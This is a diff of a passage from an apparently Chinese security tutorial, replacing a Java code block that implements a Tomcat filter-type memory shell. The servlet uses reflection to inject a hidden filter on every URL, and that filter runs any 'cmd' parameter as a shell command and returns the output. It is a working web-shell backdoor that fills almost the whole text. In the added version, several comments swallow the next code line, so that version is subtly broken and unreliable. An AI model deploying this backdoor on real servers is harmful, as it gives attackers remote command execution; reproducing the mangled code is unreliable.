@@ -320,119 +320,114 @@ filterConfigs.put(FilterName, filterConfig);
 ### Java版本
 
 ```java
-package demo.tomcat;
-
-import javax.servlet.*;
-import javax.servlet.annotation.WebServlet;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import java.io.IOException;
-import java.io.InputStream;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.util.Map;
-import java.util.Scanner;
-
-@WebServlet("/exploitServlet")
-public class exploitServlet extends HttpServlet {
-
-    @Override
-    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
-        this.doPost(request, response);
-    }
-
-    @Override
-    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
-        try {
-            // 1. 获取 StandardContext (剥洋葱反射法)
-            ServletContext servletContext = request.getSession().getServletContext();
-            Field appContextField = servletContext.getClass().getDeclaredField("context");
-            appContextField.setAccessible(true);
-            Object applicationContext = appContextField.get(servletContext);
-
-            Field stdContextField = applicationContext.getClass().getDeclaredField("context");
-            stdContextField.setAccessible(true);
-            Object standardContext = stdContextField.get(applicationContext);
-
-            // 2. 获取 filterConfigs 容器
-            Field configsField = standardContext.getClass().getDeclaredField("filterConfigs");
-            configsField.setAccessible(true);
-            Map filterConfigs = (Map) configsField.get(standardContext);
-
-            String filterName = "H3rmesk1t_Filter";
-
-            // 3. 检查并注入
-            if (filterConfigs.get(filterName) == null) {
-                // 定义匿名 Filter
-                Filter filter = new Filter() {
-                    @Override
-                    public void init(FilterConfig filterConfig) {}
-
-                    @Override
-                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-                        HttpServletRequest req = (HttpServletRequest) servletRequest;
-                        String cmd = req.getParameter("cmd");
-                        if (cmd != null) {
-                            // 执行命令
-                            boolean isLinux = !System.getProperty("os.name").toLowerCase().contains("win");
-                            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
-                            InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
-                            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
-                            String output = scanner.hasNext() ? scanner.next() : "";
-                            servletResponse.getWriter().write(output);
-                            servletResponse.getWriter().flush();
-                            return;
-                        }
-                        filterChain.doFilter(servletRequest, servletResponse);
-                    }
-
-                    @Override
-                    public void destroy() {}
-                };
-
-                // 4. 反射创建并配置 FilterDef
-                Class<?> filterDefClazz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
-                Object filterDef = filterDefClazz.getConstructor().newInstance();
-                filterDefClazz.getMethod("setFilterName", String.class).invoke(filterDef, filterName);
-                filterDefClazz.getMethod("setFilterClass", String.class).invoke(filterDef, filter.getClass().getName());
-                filterDefClazz.getMethod("setFilter", Filter.class).invoke(filterDef, filter);
-                
-                // standardContext.addFilterDef(filterDef)
-                Method addFilterDefMethod = standardContext.getClass().getMethod("addFilterDef", filterDefClazz);
-                addFilterDefMethod.invoke(standardContext, filterDef);
-
-                // 5. 反射创建并配置 FilterMap
-                Class<?> filterMapClazz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
-                Object filterMap = filterMapClazz.getConstructor().newInstance();
-                filterMapClazz.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");
-                filterMapClazz.getMethod("setFilterName", String.class).invoke(filterMap, filterName);
-                // 设置 Dispatcher 为 REQUEST
-                filterMapClazz.getMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
-                
-                // standardContext.addFilterMapBefore(filterMap)
-                Method addFilterMapBeforeMethod = standardContext.getClass().getMethod("addFilterMapBefore", filterMapClazz);
-                addFilterMapBeforeMethod.invoke(standardContext, filterMap);
-
-                // 6. 反射创建 ApplicationFilterConfig 并放入 filterConfigs
-                Class<?> appConfigClazz = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
-                Class<?> contextClazz = Class.forName("org.apache.catalina.Context");
-                Constructor<?> appConfigConstructor = appConfigClazz.getDeclaredConstructor(contextClazz, filterDefClazz);
-                appConfigConstructor.setAccessible(true);
-                Object filterConfig = appConfigConstructor.newInstance(standardContext, filterDef);
-
-                filterConfigs.put(filterName, filterConfig);
-
-                response.getWriter().write("Inject Successfully!");
-            } else {
-                response.getWriter().write("Filter already exists!");
-            }
-        } catch (Exception e) {
-            response.setStatus(500);
-            e.printStackTrace(response.getWriter());
-        }
-    }
+package demo.tomcat;  
+  
+import javax.servlet.*;  
+import javax.servlet.annotation.WebServlet;  
+import javax.servlet.http.HttpServlet;  
+import javax.servlet.http.HttpServletRequest;  
+import javax.servlet.http.HttpServletResponse;  
+import java.io.IOException;  
+import java.io.InputStream;  
+import java.lang.reflect.Constructor;  
+import java.lang.reflect.Field;  
+import java.lang.reflect.Method;  
+import java.util.Map;  
+import java.util.Scanner;  
+  
+@WebServlet("/exploitServlet")  
+public class EvilFinal extends HttpServlet {  
+  
+    @Override  
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {  
+        this.doPost(request, response);  
+    }  
+  
+    @Override  
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {  
+        try {  
+            // 1. 获取 StandardContext (剥洋葱反射法)  
+            ServletContext servletContext = request.getSession().getServletContext();  
+            Field appContextField = servletContext.getClass().getDeclaredField("context");  
+            appContextField.setAccessible(true);  
+            Object applicationContext = appContextField.get(servletContext);  
+  
+            Field stdContextField = applicationContext.getClass().getDeclaredField("context");  
+            stdContextField.setAccessible(true);  
+            Object standardContext = stdContextField.get(applicationContext);  
+  
+            // 2. 获取 filterConfigs 容器  
+            Field configsField = standardContext.getClass().getDeclaredField("filterConfigs");  
+            configsField.setAccessible(true);  
+            Map filterConfigs = (Map) configsField.get(standardContext);  
+  
+            String filterName = "Evil_Filter";  
+  
+            // 3. 检查并注入  
+            if (filterConfigs.get(filterName) == null) {  
+                // 定义匿名 Filter                Filter filter = new Filter() {  
+                    @Override  
+                    public void init(FilterConfig filterConfig) {}  
+  
+                    @Override  
+                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
+                        HttpServletRequest req = (HttpServletRequest) servletRequest;  
+                        String cmd = req.getParameter("cmd");  
+                        if (cmd != null) {  
+                            // 执行命令  
+                            boolean isLinux = !System.getProperty("os.name").toLowerCase().contains("win");  
+                            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};  
+                            InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();  
+                            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");  
+                            String output = scanner.hasNext() ? scanner.next() : "";  
+                            servletResponse.getWriter().write(output);  
+                            servletResponse.getWriter().flush();  
+                            return;  
+                        }  
+                        filterChain.doFilter(servletRequest, servletResponse);  
+                    }  
+  
+                    @Override  
+                    public void destroy() {}  
+                };  
+  
+                // 4. 反射创建并配置 FilterDef                Class<?> filterDefClazz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
+                Object filterDef = filterDefClazz.getConstructor().newInstance();  
+                filterDefClazz.getMethod("setFilterName", String.class).invoke(filterDef, filterName);  
+                filterDefClazz.getMethod("setFilterClass", String.class).invoke(filterDef, filter.getClass().getName());  
+                filterDefClazz.getMethod("setFilter", Filter.class).invoke(filterDef, filter);  
+  
+                // standardContext.addFilterDef(filterDef)  
+                Method addFilterDefMethod = standardContext.getClass().getMethod("addFilterDef", filterDefClazz);  
+                addFilterDefMethod.invoke(standardContext, filterDef);  
+  
+                // 5. 反射创建并配置 FilterMap                Class<?> filterMapClazz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
+                Object filterMap = filterMapClazz.getConstructor().newInstance();  
+                filterMapClazz.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");  
+                filterMapClazz.getMethod("setFilterName", String.class).invoke(filterMap, filterName);  
+                // 设置 Dispatcher 为 REQUEST                filterMapClazz.getMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");  
+  
+                // standardContext.addFilterMapBefore(filterMap)  
+                Method addFilterMapBeforeMethod = standardContext.getClass().getMethod("addFilterMapBefore", filterMapClazz);  
+                addFilterMapBeforeMethod.invoke(standardContext, filterMap);  
+  
+                // 6. 反射创建 ApplicationFilterConfig 并放入 filterConfigs                Class<?> appConfigClazz = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
+                Class<?> contextClazz = Class.forName("org.apache.catalina.Context");  
+                Constructor<?> appConfigConstructor = appConfigClazz.getDeclaredConstructor(contextClazz, filterDefClazz);  
+                appConfigConstructor.setAccessible(true);  
+                Object filterConfig = appConfigConstructor.newInstance(standardContext, filterDef);  
+  
+                filterConfigs.put(filterName, filterConfig);  
+  
+                response.getWriter().write("Inject Successfully!");  
+            } else {  
+                response.getWriter().write("Filter already exists!");  
+            }  
+        } catch (Exception e) {  
+            response.setStatus(500);  
+            e.printStackTrace(response.getWriter());  
+        }  
+    }  
 }
 ```
 
